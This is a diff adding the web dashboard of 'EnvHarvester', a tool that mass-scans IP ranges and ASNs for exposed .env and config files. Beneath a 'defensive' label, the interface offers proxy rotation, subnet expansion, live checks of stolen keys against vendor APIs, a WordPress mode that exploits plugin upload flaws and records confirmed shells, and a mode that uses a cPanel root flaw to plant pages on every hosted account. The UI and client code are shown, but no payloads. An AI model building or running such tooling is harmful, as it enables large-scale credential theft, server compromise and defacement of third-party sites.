@@ -1,0 +1,1832 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>EnvHarvester – .env Probe</title>
+<style>
+:root {
+  --bg:     #08080f;
+  --surf:   #0f0f1a;
+  --surf2:  #16162a;
+  --border: #1c1c33;
+  --accent: #6366f1;
+  --acc-d:  rgba(99,102,241,.12);
+  --green:  #10b981;
+  --grn-d:  rgba(16,185,129,.12);
+  --red:    #ef4444;
+  --red-d:  rgba(239,68,68,.12);
+  --amber:  #f59e0b;
+  --text:   #e2e8f0;
+  --muted:  #4b5563;
+  --mono: 'JetBrains Mono','Fira Code','Cascadia Code',ui-monospace,monospace;
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{font-size:13px}
+body{
+  background:var(--bg);color:var(--text);
+  font-family:var(--mono);
+  min-height:100vh;display:flex;flex-direction:column;
+}
+a{color:inherit}
+
+.hd{
+  display:flex;align-items:center;justify-content:space-between;
+  padding:14px 24px;
+  border-bottom:1px solid var(--border);
+  background:var(--surf);flex-shrink:0;
+}
+.hd-l{display:flex;align-items:baseline;gap:14px}
+.logo{font-size:15px;font-weight:800;letter-spacing:3px;text-transform:uppercase;color:var(--accent)}
+.sub{font-size:10px;color:var(--muted);letter-spacing:1.5px;text-transform:uppercase}
+
+.pill{
+  display:flex;align-items:center;gap:7px;
+  padding:4px 12px;border-radius:20px;
+  font-size:10px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;
+  border:1px solid var(--border);transition:all .3s;
+}
+.pill.idle{color:var(--muted)}
+.pill.run{color:var(--green);border-color:var(--green);background:var(--grn-d)}
+.pill.stop{color:var(--red);border-color:var(--red);background:var(--red-d)}
+.pill.done{color:var(--accent);border-color:var(--accent);background:var(--acc-d)}
+.dot{width:6px;height:6px;border-radius:50%;background:currentColor}
+.pill.run .dot{animation:blink 1.4s infinite}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:.2}}
+
+.main{
+  flex:1;max-width:1320px;margin:0 auto;width:100%;
+  padding:20px 24px;display:flex;flex-direction:column;gap:16px;
+}
+.card{
+  background:var(--surf);border:1px solid var(--border);
+  border-radius:8px;padding:18px 22px;
+}
+.lbl{
+  font-size:9px;font-weight:700;letter-spacing:2.5px;
+  text-transform:uppercase;color:var(--muted);margin-bottom:14px;
+}
+
+.field{margin-bottom:12px}
+.field label{
+  display:block;font-size:9px;font-weight:700;
+  letter-spacing:2px;text-transform:uppercase;
+  color:var(--muted);margin-bottom:5px;
+}
+.field input,.field textarea{
+  width:100%;background:var(--surf2);border:1px solid var(--border);
+  border-radius:4px;color:var(--text);font-family:var(--mono);
+  font-size:12px;padding:7px 10px;outline:none;transition:border-color .2s;
+  resize:vertical;
+}
+.field input:focus,.field textarea:focus{border-color:var(--accent)}
+.field input::placeholder,.field textarea::placeholder{color:var(--muted)}
+
+.ctrl-row{display:flex;gap:12px;align-items:flex-end;flex-wrap:wrap}
+.ctrl-row .field{flex:0 0 160px}
+.opt{font-weight:400;letter-spacing:0;font-size:9px;color:var(--muted)}
+
+.btn-row{display:flex;gap:10px;flex-wrap:wrap;margin-top:4px}
+.btn{
+  font-family:var(--mono);font-size:11px;font-weight:700;
+  letter-spacing:1px;text-transform:uppercase;
+  padding:9px 22px;border-radius:4px;border:1px solid;
+  cursor:pointer;transition:all .18s;
+}
+.btn:disabled{opacity:.3;cursor:not-allowed}
+.btn-start{color:var(--green);border-color:var(--green);background:var(--grn-d)}
+.btn-start:not(:disabled):hover{background:var(--green);color:#08080f}
+.btn-stop{color:var(--red);border-color:var(--red);background:var(--red-d)}
+.btn-stop:not(:disabled):hover{background:var(--red);color:#08080f}
+
+.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:12px}
+@media(max-width:640px){.stats{grid-template-columns:repeat(2,1fr)}}
+.stat{
+  background:var(--surf);border:1px solid var(--border);
+  border-radius:8px;padding:14px 18px;text-align:center;
+}
+.stat-lbl{
+  font-size:9px;font-weight:700;letter-spacing:2px;
+  text-transform:uppercase;color:var(--muted);margin-bottom:7px;
+}
+.stat-val{font-size:26px;font-weight:800;color:var(--accent);line-height:1}
+.stat-val.green{color:var(--green)}
+.stat-val.sm{font-size:15px;letter-spacing:.5px}
+
+.feed-hd{display:flex;align-items:center;justify-content:space-between;margin-bottom:12px}
+.feed-title{display:flex;align-items:center;gap:8px}
+.feed-title span{font-size:9px;font-weight:700;letter-spacing:2.5px;text-transform:uppercase;color:var(--muted)}
+.hit-badge{
+  font-size:10px;padding:2px 8px;border-radius:3px;
+  border:1px solid var(--accent);color:var(--accent);background:var(--acc-d);
+}
+.btn-extract{
+  font-family:var(--mono);font-size:10px;font-weight:700;
+  letter-spacing:1px;text-transform:uppercase;
+  padding:6px 14px;border-radius:4px;
+  border:1px solid var(--accent);background:var(--acc-d);
+  color:var(--accent);cursor:pointer;transition:all .18s;
+}
+.btn-extract:hover{background:var(--accent);color:#08080f}
+
+.toast-wrap{position:sticky;bottom:8px;text-align:center;pointer-events:none;display:none}
+.toast-wrap.show{display:block}
+.toast{
+  display:inline-flex;align-items:center;gap:6px;
+  background:var(--accent);color:#08080f;
+  font-size:11px;font-weight:700;letter-spacing:1px;
+  padding:6px 16px;border-radius:20px;cursor:pointer;
+  pointer-events:all;box-shadow:0 4px 20px rgba(99,102,241,.4);
+  animation:rise .3s ease-out;
+}
+@keyframes rise{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none}}
+
+.tbl-wrap{
+  overflow:auto;max-height:420px;
+  border:1px solid var(--border);border-radius:5px;
+}
+.tbl-wrap::-webkit-scrollbar{width:5px;height:5px}
+.tbl-wrap::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px}
+
+table{width:100%;border-collapse:collapse;font-size:12px}
+thead{position:sticky;top:0;background:var(--surf2);z-index:1}
+th{
+  text-align:left;padding:9px 12px;font-size:9px;font-weight:700;
+  letter-spacing:1.5px;text-transform:uppercase;color:var(--muted);
+  border-bottom:1px solid var(--border);white-space:nowrap;
+}
+td{
+  padding:8px 12px;border-bottom:1px solid var(--border);
+  vertical-align:middle;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;
+}
+tr:last-child td{border-bottom:none}
+tr:hover td{background:var(--surf2)}
+
+.td-num{width:40px;color:var(--muted)}
+.td-key{max-width:220px;color:var(--amber);font-size:11px}
+.td-dom{max-width:160px;color:var(--green)}
+.td-url{max-width:260px}
+.td-url a{color:var(--muted);text-decoration:none}
+.td-url a:hover{color:var(--accent)}
+.td-time{width:150px;color:var(--muted);font-size:11px}
+
+.badge{display:inline-block;padding:2px 7px;border-radius:3px;font-size:10px;font-weight:700;color:#08080f}
+
+@keyframes flash{0%{background:rgba(99,102,241,.18)}100%{background:transparent}}
+.row-new td{animation:flash 2s ease-out}
+
+.empty{text-align:center;padding:52px 20px;color:var(--muted)}
+.empty-ico{font-size:28px;margin-bottom:10px;opacity:.4}
+.empty p{font-size:12px}
+
+footer{
+  text-align:center;padding:12px;
+  color:var(--muted);font-size:10px;letter-spacing:.5px;
+  border-top:1px solid var(--border);
+}
+
+/* DB Connect modal */
+.db-modal-overlay{
+  display:none;position:fixed;inset:0;background:rgba(0,0,0,.7);
+  z-index:999;align-items:center;justify-content:center;
+}
+.db-modal-overlay.open{display:flex}
+.db-modal{
+  background:var(--surf);border:1px solid var(--border);border-radius:8px;
+  padding:24px;width:420px;max-width:95vw;
+}
+.db-modal h3{margin-bottom:16px;font-size:14px;color:var(--accent)}
+.db-field{display:flex;flex-direction:column;gap:4px;margin-bottom:12px}
+.db-field label{font-size:10px;color:var(--muted);text-transform:uppercase;letter-spacing:.5px}
+.db-field input,.db-field select{
+  background:var(--surf2);border:1px solid var(--border);
+  color:var(--text);font-family:var(--mono);font-size:12px;
+  padding:7px 10px;border-radius:4px;outline:none;
+}
+.db-field input:focus,.db-field select:focus{border-color:var(--accent)}
+.db-row{display:grid;grid-template-columns:1fr 100px;gap:8px}
+.db-actions{display:flex;gap:8px;margin-top:16px}
+.db-result{
+  margin-top:14px;padding:10px;border-radius:4px;font-size:11px;
+  display:none;
+}
+.db-result.ok{background:rgba(16,185,129,.12);border:1px solid var(--green);color:var(--green)}
+.db-result.err{background:var(--red-d);border:1px solid var(--red);color:var(--red)}
+.db-tables{margin-top:8px;color:var(--text);line-height:1.6}
+.btn-connect{
+  font-size:10px;padding:2px 7px;border-radius:3px;cursor:pointer;
+  background:rgba(99,102,241,.2);border:1px solid var(--accent);
+  color:var(--accent);font-family:var(--mono);white-space:nowrap;
+}
+.btn-connect:hover{background:rgba(99,102,241,.35)}
+</style>
+</head>
+<body>
+
+<header class="hd">
+  <div class="hd-l">
+    <span class="logo">EnvHarvester</span>
+    <span class="sub">Defensive .env Probe · Authorised Use Only</span>
+  </div>
+  <div class="pill idle" id="pill">
+    <div class="dot"></div>
+    <span id="pillTxt">Idle</span>
+  </div>
+</header>
+
+<main class="main">
+
+  <!-- Controls -->
+  <div class="card">
+    <div class="lbl">Target Configuration</div>
+    <div class="field">
+      <label>
+        Target Domains / IPs
+        <span class="opt">(one per line — CIDR ranges like 10.0.0.0/24 are expanded automatically)</span>
+      </label>
+      <textarea id="laravelTargets" rows="5"
+        placeholder="example.com&#10;192.168.1.10&#10;10.0.1.0/24&#10;staging.myapp.com"></textarea>
+      <div style="margin-top:5px;display:flex;align-items:center;gap:10px;flex-wrap:wrap">
+        <label class="btn-extract" style="cursor:pointer;display:inline-block">
+          📂 Load from file
+          <input type="file" id="targetFile" accept=".txt,.csv,.list" style="display:none">
+        </label>
+        <span id="uploadStatus" style="font-size:11px;color:var(--muted);display:none"></span>
+        <button id="clearUploadBtn" style="display:none;font-size:11px;padding:2px 8px;background:none;border:1px solid var(--border);border-radius:4px;color:var(--muted);cursor:pointer">✕ Clear file</button>
+      </div>
+    </div>
+    <div class="field" style="margin-top:10px">
+      <label>
+        ASN Discovery <span class="opt">(optional — one AS number per line; resolved to IP ranges automatically)</span>
+      </label>
+      <textarea id="asnTargets" rows="3"
+        placeholder="AS14061&#10;AS15169&#10;13335"></textarea>
+      <div style="margin-top:5px;display:flex;align-items:center;gap:12px;flex-wrap:wrap">
+        <div class="field" style="flex:1 1 260px;margin:0">
+          <label style="font-size:11px">
+            IPinfo Token <span class="opt">(optional — most accurate ASN lookup; leave blank for free BGPView/RIPEstat)</span>
+          </label>
+          <input type="password" id="ipinfoToken" placeholder="ipinfo.io token (optional)" style="font-size:12px">
+        </div>
+      </div>
+    </div>
+    <div class="ctrl-row">
+      <div class="field">
+        <label>Concurrency <span class="opt">(parallel probes)</span></label>
+        <input type="number" id="concurrency" value="50" min="1" max="500">
+      </div>
+      <div class="field" style="flex:1 1 260px">
+        <label>GitHub Token <span class="opt">(for GitHub secret scanning)</span></label>
+        <input type="password" id="githubToken" placeholder="ghp_xxxxxxxxxxxx">
+      </div>
+      <div class="field" style="flex:1 1 100%">
+        <label>
+          Proxy URL(s) <span class="opt">(optional — one per line, or comma-separated; supports HTTP/HTTPS/SOCKS4/SOCKS5/SOCKS5H)</span>
+        </label>
+        <textarea id="proxy" rows="2"
+          placeholder="socks5h://user:pass@residential.proxy.com:1080&#10;http://backup.proxy.com:8080"
+          style="font-family:'Courier New',monospace;font-size:12px"></textarea>
+        <div style="display:flex;gap:10px;margin-top:6px;flex-wrap:wrap;align-items:center">
+          <label style="font-size:11px;color:var(--muted);display:flex;align-items:center;gap:6px">
+            Rotation:
+            <select id="proxyRotation" style="font-size:11px;padding:2px 6px;background:var(--surf2);color:var(--text);border:1px solid var(--border);border-radius:4px">
+              <option value="round-robin">round-robin</option>
+              <option value="random">random</option>
+            </select>
+          </label>
+          <label style="font-size:11px;color:var(--muted);display:flex;align-items:center;gap:6px">
+            Retries on failure:
+            <input type="number" id="proxyRetries" value="2" min="0" max="10" style="width:50px;font-size:11px;padding:2px 6px;background:var(--surf2);color:var(--text);border:1px solid var(--border);border-radius:4px">
+          </label>
+          <label style="font-size:11px;color:var(--muted);display:flex;align-items:center;gap:6px;cursor:pointer">
+            <input type="checkbox" id="proxySkipHealth"> Skip health check
+          </label>
+          <button id="proxyTestBtn" type="button" style="font-size:11px;padding:3px 10px;background:var(--surf2);border:1px solid var(--border);border-radius:4px;color:var(--text);cursor:pointer">⚙ Test proxies</button>
+          <span id="proxyTestStatus" style="font-size:11px;color:var(--muted)"></span>
+        </div>
+      </div>
+    </div>
+
+    <div style="display:flex;gap:18px;flex-wrap:wrap;font-size:11px;color:var(--text);margin:6px 0 14px;padding:10px;background:var(--surf2);border:1px solid var(--border);border-radius:5px">
+      <label style="display:flex;align-items:center;gap:6px;cursor:pointer" title="Fast async TCP scan on ports 80/443 (1s timeout) eliminates dark IPs before HTTP probing. Saves hours on large CIDR/ASN sweeps. Only runs when >25% of targets are raw IPs.">
+        <input type="checkbox" id="optTcpPrefilter" checked> TCP pre-filter dark IPs
+      </label>
+      <label style="display:flex;align-items:center;gap:6px;cursor:pointer" title="After the main scan, deep-scan all unprobed /24 neighbors of confirmed hit IPs. If one server in a subnet is misconfigured, the staging/backup/mail servers often are too. TCP prefilter is bypassed for these neighbors.">
+        <input type="checkbox" id="optSubnetExpand" checked> /24 subnet expand on hits
+      </label>
+      <label style="display:flex;align-items:center;gap:6px;cursor:pointer">
+        <input type="checkbox" id="optAutoExpand" checked> Auto-expand bare IPs to /24 subnet
+      </label>
+      <label style="display:flex;align-items:center;gap:6px;cursor:pointer">
+        <input type="checkbox" id="optCrtsh"> Enumerate subdomains via crt.sh
+      </label>
+      <label id="optUrlscanLabel" style="display:none;align-items:center;gap:6px;cursor:pointer" title="Query URLScan.io for WordPress sites. Free — no API key required. Optional key in settings raises rate limits.">
+        <input type="checkbox" id="optUrlscan"> URLScan.io discovery
+        <span style="font-size:10px;color:#22c55e;font-weight:600">FREE</span>
+      </label>
+      <label style="display:flex;align-items:center;gap:6px;cursor:pointer">
+        <input type="checkbox" id="optVerify" checked> Verify keys live with vendor APIs
+      </label>
+      <label style="display:flex;align-items:center;gap:6px" title="Auto: uses 3 paths (/.env, /.env.bak, /.env.old) when targets exceed 50 000. Fast: always 3 paths. All: every configured path regardless of target count.">
+        Paths:
+        <select id="optPathsMode" style="font-size:11px;padding:2px 6px;background:var(--surf2);color:var(--text);border:1px solid var(--border);border-radius:4px">
+          <option value="auto">Auto (fast when &gt;50k targets)</option>
+          <option value="all">All paths (thorough)</option>
+          <option value="fast">Fast only (3 paths)</option>
+        </select>
+      </label>
+      <label style="display:flex;align-items:center;gap:6px" title="Cap hosts scanned per run. Re-run to continue — completed hosts are skipped automatically. 0 = unlimited.">
+        Max hosts/run:
+        <input type="number" id="maxHostsPerRun" value="100000" min="0" max="10000000"
+          style="width:90px;font-size:11px;padding:2px 6px;background:var(--surf2);color:var(--text);border:1px solid var(--border);border-radius:4px">
+      </label>
+    </div>
+
+    <!-- Scan mode toggle -->
+    <div style="margin:10px 0 14px">
+      <div style="display:flex;gap:4px;font-size:12px;font-weight:600;text-transform:uppercase;letter-spacing:.5px;margin-bottom:8px;color:var(--muted)">Scanner</div>
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px">
+        <div id="modeGroupEnv" style="border:2px solid var(--accent);border-radius:6px;padding:10px 12px;background:var(--surf2);cursor:pointer" onclick="document.getElementById('modeLaravel').click()">
+          <div style="font-size:12px;font-weight:700;color:var(--accent);margin-bottom:4px">
+            <input type="radio" name="scanMode" id="modeLaravel" value="laravel" checked style="accent-color:var(--accent)"> .ENV / SECRET SCAN
+          </div>
+          <div style="font-size:10px;color:var(--muted);line-height:1.4">Probe exposed .env files, config files, Git repos. Extract API keys, DB credentials, SMTP secrets.</div>
+          <div style="margin-top:6px;display:flex;gap:6px;flex-wrap:wrap">
+            <label style="display:flex;align-items:center;gap:4px;font-size:10px;color:var(--muted);cursor:pointer">
+              <input type="radio" name="scanMode" id="modeGithub" value="github" style="accent-color:var(--accent)"> GitHub Secrets
+            </label>
+          </div>
+        </div>
+        <div id="modeGroupWp" style="border:2px solid var(--border);border-radius:6px;padding:10px 12px;background:var(--surf2);cursor:pointer" onclick="document.getElementById('modeWordpress').click()">
+          <div style="font-size:12px;font-weight:700;color:#21759b;margin-bottom:4px">
+            <input type="radio" name="scanMode" id="modeWordpress" value="wordpress" style="accent-color:#21759b"> WORDPRESS VULN SCAN
+          </div>
+          <div style="font-size:10px;color:var(--muted);line-height:1.4">Detect WordPress sites, probe for 24 plugin CVEs across 20 upload-shell exploits, attempt exploit, verify RCE, capture shell URL.</div>
+          <div style="margin-top:6px;font-size:10px;color:#21759b;opacity:.7">24 CVEs · 20 exploitable · 4 version-detect only</div>
+        </div>
+        <div id="modeGroupBacklink" style="border:2px solid var(--border);border-radius:6px;padding:10px 12px;background:var(--surf2);cursor:pointer" onclick="document.getElementById('modeBacklink').click()">
+          <div style="font-size:12px;font-weight:700;color:#16a34a;margin-bottom:4px">
+            <input type="radio" name="scanMode" id="modeBacklink" value="backlink" style="accent-color:#16a34a"> PAGE DEPLOYMENT
+          </div>
+          <div style="font-size:10px;color:var(--muted);line-height:1.4">CVE-2026-41940: unauthenticated cPanel root → enumerate all hosted accounts → deploy index.html + antibot.html via Fileman API.</div>
+          <div style="margin-top:6px;font-size:10px;color:#16a34a;opacity:.7">Canonical tag · rotating anchors · relevance filter · daily rate cap</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="btn-row">
+      <button class="btn btn-start" id="startBtn">▶ Start Probe</button>
+      <button class="btn btn-stop"  id="stopBtn" disabled>■ Stop</button>
+    </div>
+  </div>
+
+  <!-- Stats -->
+  <div class="stats">
+    <div class="stat">
+      <div class="stat-lbl">Credentials Found</div>
+      <div class="stat-val green" id="statFound">0</div>
+    </div>
+    <div class="stat">
+      <div class="stat-lbl">Total in DB</div>
+      <div class="stat-val" id="statTotal">0</div>
+    </div>
+    <div class="stat">
+      <div class="stat-lbl">Hosts Scanned</div>
+      <div class="stat-val sm" id="statHosts">0</div>
+    </div>
+    <div class="stat">
+      <div class="stat-lbl">Status / Uptime</div>
+      <div class="stat-val sm" id="statStatus">IDLE</div>
+      <div style="font-size:11px;color:var(--muted);margin-top:4px" id="statUptime">--:--:--</div>
+    </div>
+  </div>
+
+  <!-- Live Feed -->
+  <div class="card">
+    <div class="feed-hd">
+      <div class="feed-title">
+        <span>Live Feed</span>
+        <span class="hit-badge" id="hitBadge">0 hits</span>
+      </div>
+      <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap">
+        <button class="btn-extract" id="clearHistoryBtn" title="Allow previously scanned hosts to be re-probed">🗑 Clear History</button>
+        <button class="btn-extract" id="dbManualBtn" title="Manually test a database login">🔌 DB Login</button>
+        <button class="btn-extract" id="verifyDomainsBtn" title="Check all linked domains are live — hides dead ones">⚡ Verify Domains</button>
+        <label style="display:flex;align-items:center;gap:5px;font-size:11px;color:var(--muted);cursor:pointer">
+          <input type="checkbox" id="hideDead" style="accent-color:var(--accent)"> Hide dead domains
+        </label>
+        <select id="exportFmt" style="background:var(--surf2);border:1px solid var(--border);color:var(--text);font-family:var(--mono);font-size:10px;padding:5px 8px;border-radius:4px;outline:none">
+          <option value="txt">.txt</option>
+          <option value="csv">.csv</option>
+          <option value="json">.json</option>
+        </select>
+        <button class="btn-extract" id="extractBtn">⬇ Export</button>
+      </div>
+    </div>
+
+    <div class="tbl-wrap" id="tblWrap">
+      <div class="empty" id="emptyState">
+        <div class="empty-ico">◎</div>
+        <p>No findings yet. Enter targets above and start the probe.</p>
+      </div>
+      <table id="feedTable" style="display:none">
+        <thead>
+          <tr>
+            <th class="td-num">#</th>
+            <th>Vendor</th>
+            <th>Live</th>
+            <th>Credential / Key</th>
+            <th>Domain</th>
+            <th>URL</th>
+            <th>Detected</th>
+          </tr>
+        </thead>
+        <tbody id="feedBody"></tbody>
+      </table>
+    </div>
+
+    <div class="toast-wrap" id="toastWrap">
+      <div class="toast" id="toastEl">▼ New hits – click to scroll</div>
+    </div>
+  </div>
+
+  <!-- Live Console -->
+  <div class="card">
+    <div class="feed-hd">
+      <div class="feed-title">
+        <span>Live Console</span>
+        <span class="hit-badge" id="logCount">0 lines</span>
+      </div>
+      <button class="btn-extract" id="logClearBtn">Clear</button>
+    </div>
+    <div id="logBox" style="background:#000;color:#9aa;font-size:11px;line-height:1.5;font-family:var(--mono);padding:10px;border:1px solid var(--border);border-radius:5px;max-height:420px;overflow:auto;white-space:pre-wrap;word-break:break-all">
+      <span style="color:var(--muted)">Waiting for harvester output…</span>
+    </div>
+  </div>
+
+  <!-- Exposed Panels -->
+  <div class="card">
+    <div class="feed-hd">
+      <div class="feed-title">
+        <span>Exposed Panels</span>
+        <span class="hit-badge" id="panelBadge">0 found</span>
+      </div>
+      <div style="display:flex;gap:8px;align-items:center">
+        <button class="btn-extract" id="panelRefreshBtn">↻ Refresh</button>
+        <button class="btn-extract" id="panelExportBtn">⬇ Export CSV</button>
+      </div>
+    </div>
+    <div class="tbl-wrap" style="max-height:320px">
+      <div class="empty" id="panelEmpty">
+        <div class="empty-ico">◎</div>
+        <p>No exposed panels found yet. Panels are auto-detected after each .env or config file hit.</p>
+      </div>
+      <table id="panelTable" style="display:none">
+        <thead>
+          <tr>
+            <th class="td-num">#</th>
+            <th>Service</th>
+            <th>Host</th>
+            <th>Port</th>
+            <th>URL</th>
+            <th>Verified</th>
+            <th>Detected</th>
+          </tr>
+        </thead>
+        <tbody id="panelBody"></tbody>
+      </table>
+    </div>
+  </div>
+
+  <!-- WordPress Vulnerabilities -->
+  <div class="card">
+    <div class="feed-hd">
+      <div class="feed-title">
+        <span>WordPress Vulnerabilities</span>
+        <span class="hit-badge" id="wpBadge">0 found</span>
+      </div>
+      <div style="display:flex;gap:8px;align-items:center">
+        <button class="btn-extract" id="wpRefreshBtn">↻ Refresh</button>
+        <button class="btn-extract" id="wpExportBtn">⬇ Export CSV</button>
+      </div>
+    </div>
+
+    <!-- Confirmed shells banner — hidden until there are verified=1 rows -->
+    <div id="wpShellsBanner" style="display:none;margin:0 0 12px;padding:12px 14px;background:#1a0a0a;border:2px solid #dc2626;border-radius:6px">
+      <div style="font-size:12px;font-weight:700;color:#dc2626;margin-bottom:8px;letter-spacing:.5px">
+        ⚠ CONFIRMED SHELLS — <span id="wpShellCount">0</span>
+      </div>
+      <div id="wpShellList" style="display:flex;flex-direction:column;gap:6px"></div>
+    </div>
+
+    <div class="tbl-wrap" style="max-height:360px">
+      <div class="empty" id="wpEmpty">
+        <div class="empty-ico">◎</div>
+        <p>No WordPress findings yet. Run a WordPress Vuln Scan to populate this table.</p>
+      </div>
+      <table id="wpTable" style="display:none">
+        <thead>
+          <tr>
+            <th class="td-num">#</th>
+            <th>Domain</th>
+            <th>Severity</th>
+            <th>Component</th>
+            <th>Version</th>
+            <th>CVE</th>
+            <th>Title</th>
+            <th>Fixed In</th>
+            <th>Verified</th>
+            <th>Shell</th>
+            <th>Detected</th>
+          </tr>
+        </thead>
+        <tbody id="wpBody"></tbody>
+      </table>
+    </div>
+  </div>
+
+</main>
+
+<footer>
+  EnvHarvester · Authorised defensive security testing only · No credentials are used or transmitted
+</footer>
+
+<script>
+const API = (window.API_BASE || '').replace(/\/$/, '');
+
+let evtSource   = null;
+let isRunning   = false;
+let rowCount    = 0;
+let sessionHits = 0;
+let localUptime = 0;
+let uptimeTick  = null;
+let autoScroll  = true;
+let pendingNew  = 0;
+let maxLoadedId = 0;
+const seenIds   = new Set();
+const SEEN_IDS_MAX = 10000;
+
+function rememberId(id) {
+  if (id == null) return;
+  seenIds.add(id);
+  if (seenIds.size > SEEN_IDS_MAX) {
+    // Drop the oldest 10% in insertion order to amortise the trim cost.
+    const drop = Math.floor(SEEN_IDS_MAX * 0.1);
+    let i = 0;
+    for (const v of seenIds) {
+      if (i++ >= drop) break;
+      seenIds.delete(v);
+    }
+  }
+}
+
+const pill       = document.getElementById('pill');
+const pillTxt    = document.getElementById('pillTxt');
+const startBtn   = document.getElementById('startBtn');
+const stopBtn    = document.getElementById('stopBtn');
+const extractBtn = document.getElementById('extractBtn');
+
+function _updateModeUI() {
+  const wpMode = document.getElementById('modeWordpress').checked;
+  const ghMode = document.getElementById('modeGithub').checked;
+  const blMode = document.getElementById('modeBacklink').checked;
+  const envGrp = document.getElementById('modeGroupEnv');
+  const wpGrp  = document.getElementById('modeGroupWp');
+  const blGrp  = document.getElementById('modeGroupBacklink');
+  envGrp.style.borderColor = (!wpMode && !blMode) ? 'var(--accent)' : 'var(--border)';
+  wpGrp.style.borderColor  = wpMode ? '#21759b' : 'var(--border)';
+  blGrp.style.borderColor  = blMode ? '#16a34a' : 'var(--border)';
+  const urlscanLabel = document.getElementById('optUrlscanLabel');
+  if (urlscanLabel) urlscanLabel.style.display = wpMode ? 'flex' : 'none';
+  if (wpMode) {
+    startBtn.textContent = '▶ Scan WordPress';
+  } else if (ghMode) {
+    startBtn.textContent = '▶ Scan GitHub';
+  } else if (blMode) {
+    startBtn.textContent = '▶ Deploy Pages';
+  } else {
+    startBtn.textContent = '▶ Start Probe';
+  }
+}
+document.querySelectorAll('input[name="scanMode"]').forEach(r => {
+  r.addEventListener('change', _updateModeUI);
+});
+_updateModeUI();
+const statFound  = document.getElementById('statFound');
+const statTotal  = document.getElementById('statTotal');
+const statHosts  = document.getElementById('statHosts');
+const statStatus = document.getElementById('statStatus');
+const statUptime = document.getElementById('statUptime');
+const feedTable  = document.getElementById('feedTable');
+const feedBody   = document.getElementById('feedBody');
+const emptyState = document.getElementById('emptyState');
+const hitBadge   = document.getElementById('hitBadge');
+const tblWrap    = document.getElementById('tblWrap');
+const toastWrap  = document.getElementById('toastWrap');
+const toastEl    = document.getElementById('toastEl');
+
+function fmt(s) {
+  const h   = Math.floor(s / 3600);
+  const m   = Math.floor((s % 3600) / 60);
+  const sec = s % 60;
+  return [h, m, sec].map(v => String(v).padStart(2, '0')).join(':');
+}
+
+function setRunning(on, serverUptime = 0, lastRunState = null) {
+  isRunning = on;
+  startBtn.disabled = on;
+  stopBtn.disabled  = !on;
+  if (on) {
+    document.dispatchEvent(new Event('scan-started'));
+    pill.className = 'pill run';
+    pillTxt.textContent = 'Running';
+    statStatus.textContent = 'RUNNING';
+    statStatus.style.color = 'var(--green)';
+  } else if (lastRunState === 'stopped') {
+    pill.className = 'pill stop';
+    pillTxt.textContent = 'Stopped';
+    statStatus.textContent = 'STOPPED';
+    statStatus.style.color = 'var(--red)';
+  } else if (lastRunState === 'finished') {
+    pill.className = 'pill done';
+    pillTxt.textContent = 'Finished';
+    statStatus.textContent = 'FINISHED';
+    statStatus.style.color = 'var(--accent)';
+  } else {
+    pill.className = 'pill idle';
+    pillTxt.textContent = 'Idle';
+    statStatus.textContent = 'IDLE';
+    statStatus.style.color = 'var(--muted)';
+  }
+  clearInterval(uptimeTick);
+  uptimeTick = null;
+  if (on) {
+    localUptime = serverUptime;
+    uptimeTick = setInterval(() => { localUptime++; statUptime.textContent = fmt(localUptime); }, 1000);
+  } else {
+    statUptime.textContent = '--:--:--';
+  }
+}
+
+const VENDOR_STYLE = {
+  resend:    { bg: '#7c3aed', label: 'resend' },
+  sendgrid:  { bg: '#1a82e2', label: 'sendgrid' },
+  mailgun:   { bg: '#f56400', label: 'mailgun' },
+  brevo:     { bg: '#0b996e', label: 'brevo' },
+  postmark:  { bg: '#ffde00', label: 'postmark' },
+  mailjet:   { bg: '#ffb300', label: 'mailjet' },
+  ses:       { bg: '#ff9900', label: 'aws ses' },
+  smtp:      { bg: '#dc2626', label: 'smtp' },
+  db:        { bg: '#6366f1', label: 'database' },
+  wordpress: { bg: '#21759b', label: 'wordpress' },
+  git:       { bg: '#f05033', label: 'git' },
+  gitlab:    { bg: '#fc6d26', label: 'gitlab token' },
+  github:    { bg: '#238636', label: 'github token' },
+  rails:     { bg: '#cc0000', label: 'rails' },
+  django:    { bg: '#092e20', label: 'django' },
+  dotnet:    { bg: '#512bd4', label: '.net' },
+  php:       { bg: '#4f5b93', label: 'php' },
+};
+
+const PANEL_STYLE = {
+  phpmyadmin: { bg: '#6366f1', label: 'phpMyAdmin' },
+  adminer:    { bg: '#4f46e5', label: 'Adminer' },
+  telescope:  { bg: '#0891b2', label: 'Telescope' },
+  horizon:    { bg: '#f59e0b', label: 'Horizon' },
+  cpanel:     { bg: '#1d4ed8', label: 'cPanel' },
+  whm:        { bg: '#b91c1c', label: 'WHM' },
+};
+
+// Vendors with no live verifier — their rows will never get a ✓/✗ badge.
+const NO_VERIFIER = new Set(['mailjet', 'ses', 'smtp']);
+
+function vendorBadge(vendor) {
+  const el = document.createElement('span');
+  el.className = 'badge';
+  const v = VENDOR_STYLE[vendor];
+  el.style.background = v ? v.bg : '#4b5563';
+  el.textContent = v ? v.label : (vendor || 'unknown');
+  return el;
+}
+
+function verifiedBadge(verified, vendor) {
+  const el = document.createElement('span');
+  el.className = 'badge';
+  if (verified === 1) { el.style.background = '#10b981'; el.textContent = '✓ live'; }
+  else if (verified === 0) { el.style.background = '#6b7280'; el.textContent = '✗ dead'; }
+  else {
+    el.style.background = 'transparent';
+    el.style.color = 'var(--muted)';
+    el.textContent = '—';
+    if (NO_VERIFIER.has(vendor)) {
+      el.title = `${vendor} has no automated verifier — verify manually`;
+    } else {
+      el.title = 'Not yet verified';
+    }
+  }
+  return el;
+}
+
+function addRow(hit, isNew = true) {
+  if (hit.id != null) {
+    if (seenIds.has(hit.id)) return;
+    rememberId(hit.id);
+  }
+  emptyState.style.display = 'none';
+  feedTable.style.display  = 'table';
+  rowCount++;
+  hitBadge.textContent = `${rowCount} hit${rowCount !== 1 ? 's' : ''}`;
+
+  const tr = document.createElement('tr');
+  if (isNew) tr.className = 'row-new';
